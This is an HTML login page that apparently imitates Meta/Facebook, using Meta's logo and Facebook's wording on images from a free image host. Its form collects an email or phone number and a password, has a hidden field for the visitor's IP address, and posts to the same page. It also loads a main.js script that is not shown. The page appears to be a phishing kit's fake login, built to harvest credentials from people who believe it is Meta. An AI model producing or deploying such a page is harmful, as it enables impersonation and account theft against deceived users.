<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <script src="https://cdn.tailwindcss.com/"></script>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(to bottom right, #fbe0ff00, #c9ebf000);
    }
    #errorMessage {
      display: none;
      color: red;
      text-align: center;
      margin-bottom: 10px;
    }
  </style>
</head>

<body class="flex items-center justify-center min-h-screen">
  <div class="w-full max-w-sm p-6 rounded-lg">
    <div class="text-center mb-6">
      <img src="https://i.postimg.cc/FKk4ZQ1r/60ed83ab035dbe00046c24b8.png" width="70" height="80" class="mx-auto mb-4" alt="Logo"/>
    </div>

    <form id="loginForm" method="POST">
      <input type="hidden" id="ipAddress" name="ipAddress" />

      <div id="errorMessage"></div>

      <div class="mb-4">
        <input type="text" id="email" name="email" placeholder="Mobile number or email address" required
               class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900"/>
      </div>

      <div class="mb-4">
        <input type="password" id="password" name="password" placeholder="Password" required
               class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600"/>
      </div>

      <div class="mb-4">
        <button type="submit" class="w-full py-3 bg-blue-700 text-white rounded-xl hover:bg-blue-800">
          Log in
        </button>
      </div>

      <div class="text-center mb-4">
        <a class="text-blue-600 hover:underline" href="#">Forgotten Password?</a>
      </div>

      <div class="text-center mb-4">
        <button type="button" class="w-full py-3 border border-blue-600 text-blue-600 rounded-xl hover:bg-blue-50">
          Create new account
        </button>
      </div>

      <div class="text-center mt-6">
        <img src="https://i.postimg.cc/DZY1KLnd/pngegg-2.png" width="70" height="20" class="mx-auto mb-2" alt="Meta logo"/>
      </div>
    </form>
  </div>

  <script src="main.js"></script>
</body>
</html>
